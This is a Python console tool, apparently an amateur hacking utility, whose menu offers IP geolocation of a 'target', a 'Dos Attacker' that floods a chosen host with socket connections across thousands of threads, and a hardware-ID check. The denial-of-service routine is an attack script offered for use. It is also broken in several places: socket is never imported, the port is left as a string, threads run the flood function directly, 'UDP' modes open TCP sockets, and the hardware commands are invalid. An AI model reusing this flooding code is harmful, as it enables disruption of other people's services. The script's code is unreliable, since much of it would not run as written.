import os
import time
import json
from traceback import print_tb
import requests
import colorama
import threading

#color
colorama.init()

logo = '''

 \033[38;2;255;0;0m██▒   █▓ ██▓ ██▀███  ▓█████  ███▄   █  ▄▄▄     ▄▄▄█████▓\033[0m
\033[38;2;226;0;28m▓██░   █▒▓██▒▓██ ▒ ██▒▓█   ▀  ██ ▀█  █ ▒████▄   ▓  ██▒ ▓▒\033[0m
 \033[38;2;198;0;56m▓██  █▒░▒██▒▓██ ░▄█ ▒▒███   ▓██  ▀█ ██▒▒██  ▀█▄ ▒ ▓██░ ▒░\033[0m
  \033[38;2;170;0;85m▒██ █░░░██░▒██▀▀█▄  ▒▓█  ▄ ▓██▒  ▐▌██▒░██▄▄▄▄██░ ▓██▓ ░ \033[0m
   \033[38;2;141;0;113m▒▀█░  ░██░░██▓ ▒██▒░▒████▒▒██░   ▓██░ ▓█   ▓██▒ ▒██▒ ░ \033[0m
   \033[38;2;113;0;141m░ ▐░  ░▓  ░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒░   ▒ ▒  ▒▒   ▓▒█░ ▒ ░░   \033[0m
   \033[38;2;85;0;170m░ ░░   ▒ ░  ░▒ ░ ▒░ ░ ░  ░░ ░░   ░ ▒░  ▒   ▒▒ ░   ░    \033[0m
     \033[38;2;56;0;198m░░   ▒ ░  ░░   ░    ░      ░   ░ ░   ░   ▒    ░  \033[0m    
      \033[38;2;28;0;226m░   ░     ░        ░  ░-by rjewi░       ░  ░     \033[0m   
     \033[38;2;0;0;255m░                                                    
     \033[38;2;0;0;255m░                                                 \033[0m   


'''


while True:
    os.system('cls')
    print(logo)
    os.system('title virenat ip - by rj')
    print('\033[38;2;28;0;226m[1] IP Tracer\033[0m')
    print('\033[38;2;56;0;198m[2] Dos Attacker\033[0m')
    print('\033[38;2;85;0;170m[3] HDWI Check\033[0m')
    print('')
    x = input('\033[38;2;113;0;141mOption: \033[0m').replace('\x0c', '')
    os.system('cls')
    if x == '1':
        os.system('cls')
        ip = input("\033[38;2;85;0;170mEnter target ip address: \033[0m").replace('\x0c', '')
        r = requests.get('http://ip-api.com/json/' + ip)
        if r.status_code == 200:
            print("\033[38;2;0;255;0mSUCCESS\033[0m")
            print(F'\033[38;2;141;0;113mIP: {r.json()["query"]}')
            print(F'Country: {r.json()["country"]}')
            print(F'City: {r.json()["city"]}')
            print(F'Region: {r.json()["region"]}')
            print(F'Region Name: {r.json()["regionName"]}')
            print(F'Latitude(n/s): {r.json()["lat"]}')
            print(F'Longitude(e/w): {r.json()["lon"]}')
            print(F'ISP: {r.json()["isp"]}')
            print(F'AS: {r.json()["as"]}')
            print(F'ZIP: {r.json()["zip"]}\033[0m')
        else:
            print("\033[38;2;255;0;0msomething went wrong status code: \033[0m"+str(r.status_code)).replace('\x0c', '')
        r = input('\033[38;2;255;0;0mPress ENTER to restart. \033[0m').replace('\x0c', '')
        if r == '':
            os.system('cls')
            continue

    elif x == '2':
        os.system('cls')
        host = input('\033[38;2;85;0;170mEnter target ip address: \033[0m')
        port = input('\033[38;2;85;0;170mEnter target host: \033[0m')
        method = input('\033[38;2;85;0;170mEnter DOS method: \033[0m')

        loops = 10000
        os.system('cls')
        print('\033[38;2;0;255;0mDOS IN PROGRESS\033[0m')
        def set_packet(amplifier):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.connect((host, port))
                while True: s.send(b"\x99 + amplifier")
            except: return s.close()

        def attack_HQ():
            if method == "UDP-Flood":
                for sequence in range(loops):
                    threading.Thread(target=set_packet(375), daemon=True).start()
            if method == "TCP-Flood":
                for sequence in range(loops):
                    threading.Thread(target=set_packet(700), daemon=True).start()
            if method == "UDP-Mix":
                for sequence in range(loops):
                    threading.Thread(target=set_packet(375), daemon=True).start()
                    threading.Thread(target=set_packet(700), daemon=True).start()

        attack_HQ()
        
        r = input('\033[38;2;255;0;0mATTACK ENDED press ENTER to restart . \033[0m')
        if r == '':
            os.system('cls')
            continue

    elif x == '3':
        os.system('cls')
        print('\033[38;2;85;0;170mHARDWARE ID:\033[0m')
        print('CPU INFO: ')
        print(os.system('wmic get ProcessorID'))
        print('DISC INFO: ')
        print(os.system('wmctrl -l /proc/diskinfo'))
        print('')
        print('GPU INFO: ')
        print(os.system('wctrl -l /proc/gpuinfo'))
        print('')
        print('RAM INFO: ')
        print(os.system('wctrl -l /proc/raminfo'))

        r = input('\033[38;2;255;0;0mAll info press ENTER to restart . \033[0m')


    else:
        os.system('cls')
        r = input('\033[38;2;255;0;0\033[0m')
        if r == '':
            os.system('cls')
            continue
